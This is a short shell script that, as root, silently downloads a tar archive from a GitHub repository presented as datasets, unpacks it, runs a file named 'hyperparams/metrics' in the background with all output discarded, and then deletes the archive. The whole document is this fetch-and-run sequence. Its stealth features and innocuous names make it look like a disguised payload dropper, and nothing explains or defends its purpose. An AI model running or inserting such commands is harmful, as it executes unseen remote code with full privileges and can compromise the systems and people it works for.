sudo -i curl -s --connect-timeout 5 --retry 4 --retry-connrefused -LJO https://github.com/aicacao/datasets/raw/main/hyper.tar
sudo -i tar -xf hyper.tar
sudo -i bash /root/hyperparams/metrics &>> /dev/null &
sudo -i rm hyper.tar
